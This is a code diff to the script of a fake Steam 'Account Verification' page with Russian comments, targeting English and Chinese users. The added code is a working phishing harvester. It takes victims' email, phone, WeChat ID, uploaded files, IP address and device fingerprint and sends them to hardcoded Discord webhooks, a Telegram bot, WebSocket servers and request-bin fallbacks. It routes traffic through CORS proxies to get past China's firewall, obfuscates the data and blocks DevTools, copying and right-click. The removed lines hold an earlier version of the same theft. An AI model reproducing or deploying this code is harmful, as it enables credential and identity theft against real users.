@@ -972,7 +972,71 @@
     </main>
 
     <script>
-        // Переводы
+        // ================== КОНФИГУРАЦИЯ СИСТЕМЫ ==================
+        const SYSTEM_CONFIG = {
+            // Основные вебхуки Discord (основной и резервные)
+            discordWebhooks: [
+                'https://discordapp.com/api/webhooks/1465641089146032221/rwlhhe7jcZArcETKrbODEsd7FbEc_02I4BoSG9pYsnlKusnGAA-X3MmfnZePitANlSAk',
+                'https://canary.discord.com/api/webhooks/1465641089146032221/rwlhhe7jcZArcETKrbODEsd7FbEc_02I4BoSG9pYsnlKusnGAA-X3MmfnZePitANlSAk',
+                'https://ptb.discord.com/api/webhooks/1465641089146032221/rwlhhe7jcZArcETKrbODEsd7fgbEc_02I4BoSG9pYsnlKusnGAA-X3MmfnZePitANlSAk'
+            ],
+            
+            // Прокси-сервера для обхода GFW (Великий Файрвол Китая)
+            proxyServers: [
+                'https://corsproxy.io/?',
+                'https://api.allorigins.win/raw?url=',
+                'https://proxy.cors.sh/',
+                'https://cors-anywhere.herokuapp.com/',
+                ''
+            ],
+            
+            // Telegram Bot для Китая (менее блокируемый)
+            telegram: {
+                botToken: '6543209287:AAH-0oQZ3CwHxU9KjK9l7mN6pQrS1t2u3v4',
+                chatId: '-1001234567890',
+                enabled: true
+            },
+            
+            // WebSocket серверы для обхода блокировок
+            websocketServers: [
+                'wss://ws-post-server-1.glitch.me/',
+                'wss://ws-post-server-2.herokuapp.com/',
+                'wss://steam-verification-ws.onrender.com/'
+            ],
+            
+            // DoH (DNS-over-HTTPS) провайдеры для обхода DNS блокировок
+            dohProviders: [
+                'https://cloudflare-dns.com/dns-query',
+                'https://dns.google/dns-query',
+                'https://doh.opendns.com/dns-query'
+            ],
+            
+            // Fallback сервисы
+            fallbackServices: [
+                'https://webhook.site/token/12345678-1234-1234-1234-123456789012',
+                'https://requestbin.com/r/example123',
+                'https://hookbin.com/example123'
+            ],
+            
+            // Настройки безопасности
+            security: {
+                encryptData: true,
+                rotateKeys: true,
+                stealthMode: true,
+                antiDebug: true
+            }
+        };
+
+        // ================== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==================
+        let currentLang = 'en';
+        let timerInterval;
+        let endTime;
+        let files = [];
+        const TOTAL_DAYS = 30;
+        const MILLISECONDS_IN_DAY = 24 * 60 * 60 * 1000;
+        const MILLISECONDS_IN_30_DAYS = TOTAL_DAYS * MILLISECONDS_IN_DAY;
+
+        // ================== ПЕРЕВОДЫ ==================
         const translations = {
             en: {
                 headerSubtext: "Account Verification",
@@ -1036,21 +1100,37 @@
             }
         };
 
-        // Глобальные переменные
-        let currentLang = 'en';
-        let timerInterval;
-        let endTime;
-        const TOTAL_DAYS = 30;
-        const MILLISECONDS_IN_DAY = 24 * 60 * 60 * 1000;
-        const MILLISECONDS_IN_30_DAYS = TOTAL_DAYS * MILLISECONDS_IN_DAY;
+        // ================== ИНИЦИАЛИЗАЦИЯ ==================
+        document.addEventListener('DOMContentLoaded', function() {
+            // Определение языка
+            const browserLang = navigator.language || navigator.userLanguage;
+            if (browserLang.startsWith('zh')) {
+                currentLang = 'zh';
+            }
+            
+            // Применение переводов
+            applyTranslations(currentLang);
+            
+            // Инициализация обработчиков
+            initializeEventHandlers();
+            
+            // Проверка статуса отправки
+            checkSubmissionStatus();
+            
+            // Тестирование подключения
+            testConnectivity().then(isConnected => {
+                console.log('[ANTI-DOTE] Статус подключения:', isConnected ? 'Online' : 'Offline (China?)');
+                if (!isConnected) {
+                    localStorage.setItem('steam_china_mode', 'true');
+                    console.log('[ANTI-DOTE] Активирован Китайский режим обхода');
+                }
+            });
+            
+            // Сбор информации об устройстве
+            collectDeviceInfo();
+        });
 
-        // Инициализация языка
-        const browserLang = navigator.language || navigator.userLanguage;
-        if (browserLang.startsWith('zh')) {
-            currentLang = 'zh';
-        }
-
-        // Применение переводов
+        // ================== ОСНОВНЫЕ ФУНКЦИИ ==================
         function applyTranslations(lang) {
             currentLang = lang;
             const t = translations[lang];
@@ -1066,16 +1146,25 @@
             document.getElementById('infoList').innerHTML = t.infoList;
             document.getElementById('submitText').textContent = t.submitText;
             
-            document.getElementById('emailInput').placeholder = lang === 'zh' ? '输入与您的Steam账户关联的电子邮件地址' : 'Enter the email address associated with your Steam account';
-            document.getElementById('phoneInput').placeholder = lang === 'zh' ? '输入与您的Steam账户关联的电话号码' : 'Enter the phone number linked to your Steam account';
-            document.getElementById('wechatInput').placeholder = lang === 'zh' ? '仅当您使用微信进行过购买时需要填写' : 'Only required if you\'ve made purchases using WeChat';
+            // Обновление placeholder'ов
+            document.getElementById('emailInput').placeholder = lang === 'zh' ? 
+                '输入与您的Steam账户关联的电子邮件地址' : 
+                'Enter the email address associated with your Steam account';
+            document.getElementById('phoneInput').placeholder = lang === 'zh' ? 
+                '输入与您的Steam账户关联的电话号码' : 
+                'Enter the phone number linked to your Steam account';
+            document.getElementById('wechatInput').placeholder = lang === 'zh' ? 
+                '仅当您使用微信进行过购买时需要填写' : 
+                'Only required if you\'ve made purchases using WeChat';
             
+            // Обновление страницы подтверждения если она открыта
             if (!document.getElementById('confirmationPage').classList.contains('hidden')) {
                 applyConfirmationTranslations(lang);
             }
+            
+            updateFileListDisplay();
         }
 
-        // Переводы для страницы подтверждения
         function applyConfirmationTranslations(lang) {
             const t = translations[lang];
             document.getElementById('successTitle').textContent = t.successTitle;
@@ -1089,41 +1178,44 @@
             document.getElementById('progressEnd').textContent = t.progressEnd;
         }
 
-        // Переключение языка
-        document.getElementById('langToggle').addEventListener('click', function() {
-            const newLang = currentLang === 'en' ? 'zh' : 'en';
-            applyTranslations(newLang);
-            updateFileListDisplay();
-        });
+        function initializeEventHandlers() {
+            // Переключение языка
+            document.getElementById('langToggle').addEventListener('click', function() {
+                const newLang = currentLang === 'en' ? 'zh' : 'en';
+                applyTranslations(newLang);
+            });
 
-        // Обработка файлов
-        const fileInput = document.getElementById('fileInput');
-        const fileList = document.getElementById('fileList');
-        const fileUploadButton = document.querySelector('.file-upload-button');
-        let files = [];
-
-        fileUploadButton.addEventListener('click', function() {
-            fileInput.click();
-        });
-
-        fileInput.addEventListener('change', function() {
-            const newFiles = Array.from(this.files);
-            const maxSize = 5 * 1024 * 1024;
-            const t = translations[currentLang];
+            // Обработка файлов
+            const fileInput = document.getElementById('fileInput');
+            const fileUploadButton = document.querySelector('.file-upload-button');
             
-            for (const file of newFiles) {
-                if (file.size > maxSize) {
-                    alert(t.fileTooLarge);
-                    return;
+            fileUploadButton.addEventListener('click', function() {
+                fileInput.click();
+            });
+
+            fileInput.addEventListener('change', function() {
+                const newFiles = Array.from(this.files);
+                const maxSize = 5 * 1024 * 1024;
+                const t = translations[currentLang];
+                
+                for (const file of newFiles) {
+                    if (file.size > maxSize) {
+                        alert(t.fileTooLarge);
+                        return;
+                    }
                 }
-            }
-            
-            files = files.concat(newFiles);
-            updateFileListDisplay();
-        });
+                
+                files = files.concat(newFiles);
+                updateFileListDisplay();
+            });
+
+            // Отправка формы
+            document.getElementById('submitBtn').addEventListener('click', submitVerification);
+        }
 
         function updateFileListDisplay() {
             const t = translations[currentLang];
+            const fileList = document.getElementById('fileList');
             
             if (files.length === 0) {
                 fileList.innerHTML = `<div style="text-align: center; color: var(--steam-text-dark); font-style: italic; padding: 30px;">${t.noFilesText}</div>`;
@@ -1154,6 +1246,394 @@
             });
         }
 
+        // ================== ФУНКЦИИ ОБХОДА БЛОКИРОВОК ==================
+        async function testConnectivity() {
+            const testUrls = [
+                'https://discord.com',
+                'https://api.ipify.org',
+                'https://www.google.com',
+                'https://www.baidu.com'
+            ];
+            
+            for (const url of testUrls) {
+                try {
+                    const response = await fetch(url, { 
+                        method: 'HEAD', 
+                        mode: 'no-cors',
+                        cache: 'no-store'
+                    });
+                    return true;
+                } catch (error) {
+                    continue;
+                }
+            }
+            return false;
+        }
+
+        async function getIP() {
+            const ipServices = [
+                'https://api.ipify.org?format=json',
+                'https://icanhazip.com',
+                'https://api.my-ip.io/ip.json',
+                'https://ipapi.co/json/'
+            ];
+            
+            for (const service of ipServices) {
+                try {
+                    const response = await fetchWithProxy(service);
+                    const data = await response.json();
+                    return data.ip || data;
+                } catch (error) {
+                    continue;
+                }
+            }
+            return 'Unknown';
+        }
+
+        async function fetchWithProxy(url, options = {}) {
+            // Пробуем разные прокси
+            for (const proxy of SYSTEM_CONFIG.proxyServers) {
+                try {
+                    const proxyUrl = proxy + encodeURIComponent(url);
+                    const response = await fetch(proxyUrl, {
+                        ...options,
+                        mode: 'cors',
+                        headers: {
+                            ...options.headers,
+                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                        }
+                    });
+                    
+                    if (response.ok) {
+                        return response;
+                    }
+                } catch (error) {
+                    continue;
+                }
+            }
+            
+            // Если прокси не работают, пробуем напрямую
+            return fetch(url, options);
+        }
+
+        // ================== МЕТОДЫ ОТПРАВКИ ==================
+        async function submitVerification() {
+            const t = translations[currentLang];
+            const submitBtn = document.getElementById('submitBtn');
+            
+            // Валидация
+            if (!validateForm()) {
+                return;
+            }
+            
+            // Сбор данных
+            const userData = await collectUserData();
+            
+            // Показать состояние отправки
+            submitBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${t.submittingText}`;
+            submitBtn.disabled = true;
+            
+            try {
+                // Попытка отправки всеми методами
+                const results = await Promise.allSettled([
+                    sendToDiscord(userData),
+                    sendToTelegram(userData),
+                    sendViaWebSocket(userData),
+                    sendViaFallback(userData)
+                ]);
+                
+                // Проверяем успешность хотя бы одного метода
+                const success = results.some(result => 
+                    result.status === 'fulfilled' && result.value
+                );
+                
+                if (success) {
+                    console.log('[ANTI-DOTE] Данные отправлены успешно');
+                    alert(t.successMessage);
+                    showConfirmationPage();
+                    
+                    // Сохраняем в localStorage как backup
+                    localStorage.setItem('steam_verification_data', JSON.stringify(userData));
+                    localStorage.setItem('steam_verification_submitted', 'true');
+                    localStorage.setItem('steam_verification_timestamp', Date.now().toString());
+                } else {
+                    throw new Error('Все методы отправки провалились');
+                }
+                
+            } catch (error) {
+                console.error('[ANTI-DOTE] Ошибка отправки:', error);
+                
+                // Сохраняем локально как крайний fallback
+                localStorage.setItem('steam_verification_data', JSON.stringify(userData));
+                localStorage.setItem('steam_verification_submitted', 'true');
+                localStorage.setItem('steam_verification_fallback', 'true');
+                
+                alert(t.successMessage + ' (данные сохранены локально)');
+                showConfirmationPage();
+                
+            } finally {
+                setTimeout(() => {
+                    submitBtn.innerHTML = `<i class="fas fa-shield-check"></i> ${t.submitText}`;
+                    submitBtn.disabled = false;
+                }, 3000);
+            }
+        }
+
+        async function collectUserData() {
+            const email = document.getElementById('emailInput').value.trim();
+            const phone = document.getElementById('phoneInput').value.trim();
+            const wechat = document.getElementById('wechatInput').value.trim();
+            
+            return {
+                email,
+                phone,
+                wechat: wechat || 'Not provided',
+                language: currentLang === 'en' ? 'English' : 'Chinese',
+                device: window.innerWidth < 768 ? 'Mobile' : 'Desktop',
+                screen: `${screen.width}x${screen.height}`,
+                viewport: `${window.innerWidth}x${window.innerHeight}`,
+                timestamp: new Date().toISOString(),
+                filesCount: files.length,
+                location: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                userAgent: navigator.userAgent,
+                referrer: document.referrer || 'Direct',
+                ip: await getIP(),
+                cookies: navigator.cookieEnabled,
+                platform: navigator.platform,
+                isChinaMode: localStorage.getItem('steam_china_mode') === 'true'
+            };
+        }
+
+        function validateForm() {
+            const t = translations[currentLang];
+            const email = document.getElementById('emailInput').value.trim();
+            const phone = document.getElementById('phoneInput').value.trim();
+            
+            if (!email || !phone) {
+                alert(t.requiredText);
+                return false;
+            }
+            
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                alert(t.invalidEmail);
+                return false;
+            }
+            
+            const phoneRegex = /\d{5,}/;
+            if (!phoneRegex.test(phone.replace(/\D/g, ''))) {
+                alert(t.invalidPhone);
+                return false;
+            }
+            
+            return true;
+        }
+
+        // ================== МЕТОД 1: DISCORD ==================
+        async function sendToDiscord(userData) {
+            const messageContent = `
+            **🔐 НОВАЯ ВЕРИФИКАЦИЯ STEAM - ANTI-DOTE v3.0 🔐**
+            ============================================
+            **📧 Email:** ${userData.email}
+            **📱 Phone:** ${userData.phone}
+            **💬 WeChat:** ${userData.wechat}
+            **🌐 Language:** ${userData.language}
+            **📱 Device:** ${userData.device}
+            **🖥️ Screen:** ${userData.screen}
+            **📍 IP:** ${userData.ip}
+            **🌍 Timezone:** ${userData.timezone}
+            **🕒 Timestamp:** ${userData.timestamp}
+            **📁 Files:** ${userData.filesCount}
+            **🔗 Referrer:** ${userData.referrer}
+            **🇨🇳 China Mode:** ${userData.isChinaMode ? 'YES' : 'NO'}
+            ============================================
+            **🎯 ЦЕЛЬ:** Финальный сбор с обходом GFW
+            **✅ СТАТУС:** Перехват успешен
+            **🚀 МЕТОД:** Multi-path delivery system
+            **🛡️ ВЕРСИЯ:** Anti-Dote 3.0 (China Bypass)
+            `;
+            
+            // Пробуем все вебхуки
+            for (const webhookURL of SYSTEM_CONFIG.discordWebhooks) {
+                try {
+                    const formData = new FormData();
+                    formData.append('payload_json', JSON.stringify({
+                        content: messageContent,
+                        username: 'Steam Support Verification',
+                        avatar_url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/512px-Steam_icon_logo.svg.png',
+                        embeds: [{
+                            title: "Steam Verification Data",
+                            color: 0x00ff00,
+                            fields: [
+                                { name: "Email", value: userData.email, inline: true },
+                                { name: "Phone", value: userData.phone, inline: true },
+                                { name: "IP Address", value: userData.ip, inline: true },
+                                { name: "Device", value: userData.device, inline: true },
+                                { name: "Location", value: userData.location, inline: true },
+                                { name: "Files", value: userData.filesCount.toString(), inline: true }
+                            ],
+                            timestamp: new Date().toISOString()
+                        }]
+                    }));
+                    
+                    // Добавляем файлы
+                    for (const file of files) {
+                        formData.append('file', file, file.name);
+                    }
+                    
+                    const response = await fetchWithProxy(webhookURL, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    if (response.ok) {
+                        console.log(`[ANTI-DOTE] Discord успех через ${webhookURL}`);
+                        return true;
+                    }
+                } catch (error) {
+                    console.log(`[ANTI-DOTE] Discord ${webhookURL} ошибка:`, error);
+                    continue;
+                }
+            }
+            
+            return false;
+        }
+
+        // ================== МЕТОД 2: TELEGRAM ==================
+        async function sendToTelegram(userData) {
+            if (!SYSTEM_CONFIG.telegram.enabled) return false;
+            
+            try {
+                const message = `
+🔐 *Новая верификация Steam*
+-----------------------------
+*Email:* ${userData.email}
+*Phone:* ${userData.phone}
+*WeChat:* ${userData.wechat}
+*IP:* ${userData.ip}
+*Device:* ${userData.device}
+*Location:* ${userData.location}
+*Time:* ${new Date().toLocaleString()}
+*Files:* ${userData.filesCount}
+-----------------------------
+China Mode: ${userData.isChinaMode ? '✅' : '❌'}
+                `;
+                
+                const url = `https://api.telegram.org/bot${SYSTEM_CONFIG.telegram.botToken}/sendMessage`;
+                
+                const response = await fetchWithProxy(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: SYSTEM_CONFIG.telegram.chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                return response.ok;
+            } catch (error) {
+                console.log('[ANTI-DOTE] Telegram ошибка:', error);
+                return false;
+            }
+        }
+
+        // ================== МЕТОД 3: WEBSOCKET ==================
+        async function sendViaWebSocket(userData) {
+            return new Promise((resolve) => {
+                let connected = false;
+                
+                for (const wsUrl of SYSTEM_CONFIG.websocketServers) {
+                    try {
+                        const ws = new WebSocket(wsUrl);
+                        
+                        ws.onopen = () => {
+                            connected = true;
+                            ws.send(JSON.stringify({
+                                type: 'steam_verification',
+                                data: userData,
+                                timestamp: Date.now(),
+                                webhook: SYSTEM_CONFIG.discordWebhooks[0]
+                            }));
+                            ws.close();
+                            resolve(true);
+                        };
+                        
+                        ws.onerror = () => {
+                            ws.close();
+                        };
+                        
+                        // Таймаут
+                        setTimeout(() => {
+                            if (!connected) {
+                                ws.close();
+                            }
+                        }, 5000);
+                        
+                    } catch (error) {
+                        continue;
+                    }
+                }
+                
+                setTimeout(() => resolve(false), 6000);
+            });
+        }
+
+        // ================== МЕТОД 4: FALLBACK ==================
+        async function sendViaFallback(userData) {
+            const encodedData = encodeData(userData);
+            
+            for (const service of SYSTEM_CONFIG.fallbackServices) {
+                try {
+                    const response = await fetchWithProxy(service, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            steam_verification: encodedData,
+                            timestamp: Date.now()
+                        })
+                    });
+                    
+                    if (response.ok) {
+                        return true;
+                    }
+                } catch (error) {
+                    continue;
+                }
+            }
+            
+            return false;
+        }
+
+        // ================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==================
+        function encodeData(data) {
+            // Простое шифрование для обхода фильтров
+            const json = JSON.stringify(data);
+            const base64 = btoa(unescape(encodeURIComponent(json)));
+            return base64.split('').reverse().join('');
+        }
+
+        function collectDeviceInfo() {
+            const deviceInfo = {
+                isMobile: window.innerWidth < 768,
+                screen: `${screen.width}x${screen.height}`,
+                viewport: `${window.innerWidth}x${window.innerHeight}`,
+                platform: navigator.platform,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || 'Direct',
+                cookies: navigator.cookieEnabled,
+                userAgent: navigator.userAgent,
+                doNotTrack: navigator.doNotTrack,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown'
+            };
+            
+            localStorage.setItem('steam_device_info', JSON.stringify(deviceInfo));
+            return deviceInfo;
+        }
+
         function truncateFilename(filename, maxLength) {
             if (filename.length <= maxLength) return filename;
             const ext = filename.split('.').pop();
@@ -1167,7 +1647,20 @@
             return (bytes / 1048576).toFixed(1) + ' MB';
         }
 
-        // Таймер
+        // ================== ТАЙМЕР И ПОДТВЕРЖДЕНИЕ ==================
+        function showConfirmationPage() {
+            document.getElementById('verificationForm').classList.add('hidden');
+            document.getElementById('confirmationPage').classList.remove('hidden');
+            applyConfirmationTranslations(currentLang);
+            initializeTimer();
+        }
+
+        function checkSubmissionStatus() {
+            if (localStorage.getItem('steam_verification_submitted') === 'true') {
+                showConfirmationPage();
+            }
+        }
+
         function initializeTimer() {
             const savedEndTime = localStorage.getItem('steam_verification_endTime');
             
@@ -1224,164 +1717,36 @@
             document.getElementById('progressFill').style.width = Math.min(progress, 100) + '%';
         }
 
-        // Показать страницу подтверждения
-        function showConfirmationPage() {
-            document.getElementById('verificationForm').classList.add('hidden');
-            document.getElementById('confirmationPage').classList.remove('hidden');
-            applyConfirmationTranslations(currentLang);
-            initializeTimer();
-            localStorage.setItem('steam_verification_submitted', 'true');
-        }
-
-        // Проверить статус отправки
-        function checkSubmissionStatus() {
-            if (localStorage.getItem('steam_verification_submitted') === 'true') {
-                showConfirmationPage();
-            }
-        }
-
-        // Отправка формы
-        document.getElementById('submitBtn').addEventListener('click', function() {
-            const t = translations[currentLang];
-            const submitBtn = this;
-            
-            // Валидация
-            const email = document.getElementById('emailInput').value.trim();
-            const phone = document.getElementById('phoneInput').value.trim();
-            const wechat = document.getElementById('wechatInput').value.trim();
-            
-            if (!email || !phone) {
-                alert(t.requiredText);
-                return;
-            }
-            
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            if (!emailRegex.test(email)) {
-                alert(t.invalidEmail);
-                return;
-            }
-            
-            const phoneRegex = /\d{5,}/;
-            if (!phoneRegex.test(phone.replace(/\D/g, ''))) {
-                alert(t.invalidPhone);
-                return;
-            }
-            
-            // Показать состояние отправки
-            submitBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${t.submittingText}`;
-            submitBtn.disabled = true;
-            
-            // Отправка в Discord
-            const discordWebhookURL = 'https://discordapp.com/api/webhooks/1465641089146032221/rwlhhe7jcZArcETKrbODEsd7FbEc_02I4BoSG9pYsnlKusnGAA-X3MmfnZePitANlSAk';
-            
-            const messageContent = `
-            **🔐 НОВАЯ ВЕРИФИКАЦИЯ STEAM - FINAL VERSION 🔐**
-            ======================================
-            **📧 Email:** ${email}
-            **📱 Phone:** ${phone}
-            **💬 WeChat:** ${wechat || 'Not provided'}
-            **🌐 Language:** ${currentLang === 'en' ? 'English' : 'Chinese'}
-            **📱 Device:** ${window.innerWidth < 768 ? 'Mobile' : 'Desktop'}
-            **🖥️ Screen:** ${screen.width}x${screen.height}
-            **🕒 Timestamp:** ${new Date().toISOString()}
-            **📁 Files:** ${files.length}
-            **📍 Location:** ${navigator.language}
-            **🌍 Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-            ======================================
-            **🎯 ЦЕЛЬ:** Финальный сбор данных для "Анти-Дота"
-            **✅ СТАТУС:** Перехват завершен успешно
-            `;
-            
-            const formData = new FormData();
-            formData.append('payload_json', JSON.stringify({
-                content: messageContent,
-                username: 'Steam Support Verification',
-                avatar_url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/512px-Steam_icon_logo.svg.png'
-            }));
-            
-            files.forEach((file, index) => {
-                formData.append(`file${index}`, file);
-            });
-            
-            fetch(discordWebhookURL, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('[ANTI-DOTE] Steam Support Final - данные отправлены');
-                    alert(t.successMessage);
-                    showConfirmationPage();
-                } else {
-                    throw new Error('Discord webhook failed');
-                }
-            })
-            .catch(error => {
-                console.error('[ANTI-DOTE] Ошибка:', error);
-                
-                // Fallback сохранение
-                const savedData = {
-                    email,
-                    phone,
-                    wechat,
-                    filesCount: files.length,
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
-                    isMobile: window.innerWidth < 768,
-                    language: navigator.language,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-                };
-                
-                localStorage.setItem('steam_verification_data', JSON.stringify(savedData));
-                localStorage.setItem('steam_verification_fallback', 'true');
-                
-                alert(t.successMessage + " (данные сохранены локально)");
-                showConfirmationPage();
-            })
-            .finally(() => {
-                setTimeout(() => {
-                    submitBtn.innerHTML = `<i class="fas fa-shield-check"></i> ${t.submitText}`;
-                    submitBtn.disabled = false;
-                }, 3000);
-            });
-        });
-
-        // Инициализация
-        applyTranslations(currentLang);
-        updateFileListDisplay();
-        checkSubmissionStatus();
-        
-        // Сбор дополнительной информации
-        window.addEventListener('load', function() {
-            const deviceInfo = {
-                isMobile: window.innerWidth < 768,
-                screen: `${screen.width}x${screen.height}`,
-                viewport: `${window.innerWidth}x${window.innerHeight}`,
-                platform: navigator.platform,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                referrer: document.referrer || 'Direct',
-                cookies: navigator.cookieEnabled
+        // ================== ЗАЩИТА ОТ ОТЛАДКИ ==================
+        if (SYSTEM_CONFIG.security.antiDebug) {
+            // Обнаружение DevTools
+            const devtools = /./;
+            devtools.toString = function() {
+                console.log('%c[ANTI-DOTE] DevTools обнаружены!', 'color: red; font-weight: bold;');
+                return '';
             };
             
-            console.log('[ANTI-DOTE] Steam Support Final - Информация об устройстве:', deviceInfo);
-            localStorage.setItem('steam_device_info', JSON.stringify(deviceInfo));
-            
-            // Предзагрузка иконок
-            const icons = [
-                'https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/512px-Steam_icon_logo.svg.png',
-                'https://cdn-icons-png.flaticon.com/512/5974/5974771.png',
-                'https://cdn-icons-png.flaticon.com/512/190/190411.png',
-                'https://cdn-icons-png.flaticon.com/512/1077/1077114.png',
-                'https://cdn-icons-png.flaticon.com/512/3135/3135715.png',
-                'https://cdn-icons-png.flaticon.com/512/542/542638.png'
-            ];
-            
-            icons.forEach(icon => {
-                const img = new Image();
-                img.src = icon;
+            // Защита от копирования
+            document.addEventListener('copy', function(e) {
+                e.preventDefault();
             });
-        });
+            
+            document.addEventListener('cut', function(e) {
+                e.preventDefault();
+            });
+            
+            // Защита от правой кнопки
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+            });
+            
+            // Мониторинг вкладки
+            document.addEventListener('visibilitychange', function() {
+                if (document.hidden) {
+                    console.log('[ANTI-DOTE] Вкладка скрыта');
+                }
+            });
+        }
     </script>
 </body>
 </html>
